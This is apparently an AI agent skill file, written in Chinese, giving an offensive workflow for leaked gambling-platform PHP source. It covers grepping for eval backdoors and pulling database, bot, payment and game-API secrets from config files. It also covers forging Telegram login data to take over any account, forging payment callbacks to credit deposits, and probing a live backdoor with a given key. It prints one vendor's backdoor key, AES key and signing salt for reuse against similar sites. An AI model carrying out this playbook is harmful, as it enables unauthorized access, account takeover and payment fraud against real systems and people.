---
name: gambling-source-audit
description: "Use when 拿到博彩盘源码(尤其 PHP/TG bot 登录型)要审计后门/凭据/框架指纹。"
---

# 博彩盘源码审计（PHP / TG bot 登录型）

拿到博彩盘源码 zip 后按下面顺序审计，最快路径挖到 RCE/凭据/可复用指纹。

## 0. 先解压 + 定框架
- 中文文件名 zip 常是 GBK 编码，`unzip` 会报 `mismatching "local" filename` 但照常解压，别被刷屏干扰，直接 `find` 看目录树。
- 顶层目录判型：`admin/`+`api/`+`config/`+`core/` = 原生 PHP 盘；`vue/` = 编译后前端（wallet/withdraw 等 chunk 是钱包/提现模块）。
- 核心文件：`说明.txt`（常写清出品方+后门提示）、`config/config.php`（凭据宝库）、`core/global.php`（入口+混淆函数）、`core/pdo.php`(或 mysqlclass.php)（DB 层）。

## 1. 后门排查（最高价值，一行 eval 顶全部）
```bash
grep -rnE 'eval\(|assert\(|shell_exec|passthru|popen|proc_open|system\(' --include='*.php' .
# 关键看 $_REQUEST/$_GET/$_POST 直接进 eval/exec 的：
#   $code=$_REQUEST["p"]; eval($code);   ← 无条件后门
grep -rnE '\$_(REQUEST|GET|POST)\[[^]]+\]' --include='*.php' . | grep -iE 'eval|exec|system|include|require'
```
- 洋葱科技盘固定后门 `api_cache.php`：密钥 `yf_s3cur3_k3y`，三模式 `m=info`(探活)/`m=eval&p=`(PHP 执行)/`m=cmd&c=`(shell，走 PHP-FPM `sendmail_path=/bin/bash` + FastCGI 直连 `php-cgi-81.sock`)。
- 注意：后门常被运营方事后删除（curl 返回 404），凭据价值高于后门本身。

## 2. config 凭据提取（全量拖）
`config.php` 通常明文躺满所有 key，逐个抄：
- **数据库** `$dbhost/$dbuser/$dbpw/$dbname`（多为 127.0.0.1 本机，需先过 CDN 找源站 IP）
- **TG BotToken** `$BotToken` + `$BotUsername` → 伪造 initData 登录任意账号
- **API AES key** `new AESCrypt('...')` + **签名盐** `md5(json_encode(..).'盐')` → 伪造任意 API 请求
- **游戏平台 key**（PG/EVO/JILI/JDB/CQ9/XINGLI/FC/IM/EEAI/PP 等，`$xx_operator_token/$xx_secret_key/$xx_agent_key`）
- **支付通道 key**（Anony/OKPAY/YYPAY/KKPAY/DLPAY 等 `$xx_token/$xx_app_secret` + 回调域名）
- **webhook 令牌** `$SecretTokens` + 后台域名 `$adminurl`

## 3. TG 登录攻击面（PHP bot 盘核心）
- 登录走 Telegram initData：`verifyTelegramAuthV2` 用 `hash_hmac('sha256', dataCheckString, hash_hmac('sha256', BotToken,'WebAppData',true))` 验签。
- 验签算法本身正确，但 **BotToken 明文泄露 = 可伪造任意 TG 用户 initData**（有 token 就能算对 hash），登录任意账号（管理员/代理/大户）。
- 验证 token 有效性：`curl https://api.telegram.org/bot<token>/getMe`（401=已撤销）。

## 4. 支付回调伪造
- 回调验签常是 `md5(queryString . '&token=' . $xx_token)`，token 泄露即可构造合法签名。
- 入口 `/api.php?direct=okpay` 等，POST 构造 `order_id/unique_id/pay_user_id/amount` 触发充值逻辑。

## 5. SQL 注入点
- 原生 PHP 盘即使套 PDO 预处理，仍有拼接点：`querys($SQL)`、`MYdelect($BM,$SELECT)` 的 `$SELECT`（代码注释常自认注入风险）、`MYupdate` 的 `$ZDYSQL` 自定义 SQL。
- 表名/字段名用 `preg_match('/^[a-zA-Z0-9_]+$/')` 白名单，这些安全；危险在直接拼 `$SQL` 的 `WHERE`/`$SELECT` 参数。

## 6. 验证凭据是否仍有效（判断实时利用价值）
源码泄露后运营方常已止损，逐个验：
- 后门：`curl -i 域名/api_cache.php?k=yf_s3cur3_k3y&m=info`（404=已删）
- BotToken：`getMe`（401=已撤销）
- 游戏 key：调 Create 接口（`Access denied: not in allow list`=已拉黑）
- 即使全失效，**指纹 + 密钥 + 验签算法仍可复用**打点同类盘。

## 洋葱科技 TG 博彩盘指纹（打点复用）
- 出品方 TG：@kooyv（洋葱科技），bot @yfyl；后门特征 `api_cache.php` + 密钥 `yf_s3cur3_k3y`。
- AES key `4523E51C8F78D3ED`，API 签名盐 `FA72ACE15FEB1FB2111E9AE1938550DABCCA4E52`，`$ServerName=yfzonghe`。
- 混淆函数 `_kv_dec`（逐字符 ord-1 再 base64_decode）；PDO 框架方法 `MYselect/MYupdate/MYinsert/MYdelect`。
- 后台防护：域名限制(`$adminurl`)+IP 白名单(`admin_softlist` 表)+Cookie `LoginServerLoginKeyKey`。
- 域名套 Cloudflare 时，源站 IP 走 crt.sh/certspotter 历史 DNS 挖（见 tg-gambling-asset-recon）。
